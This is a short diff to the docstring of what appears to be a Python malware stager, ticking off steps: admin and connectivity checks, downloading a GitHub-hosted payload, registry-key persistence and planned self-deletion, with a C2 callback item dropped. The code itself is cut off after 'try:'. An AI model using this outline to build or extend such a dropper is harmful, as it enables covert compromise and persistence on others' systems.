@@ -1,9 +1,8 @@
 """
 Always run on boot
 [X] It will first check if ran as administrator, and has internet connectivity.
-[] It will then download the payload hosted on github and save on disk.
-[] It will then do a *callback to the C2 to establish alive.
-[] It will then create persistence for the payload via [service | registry key].
+[X] It will then download the payload hosted on github and save on disk.
+[X] It will then create persistence for the payload via registry key.
 [] Lastly, it will delete itself off the disk.
 """
 try:
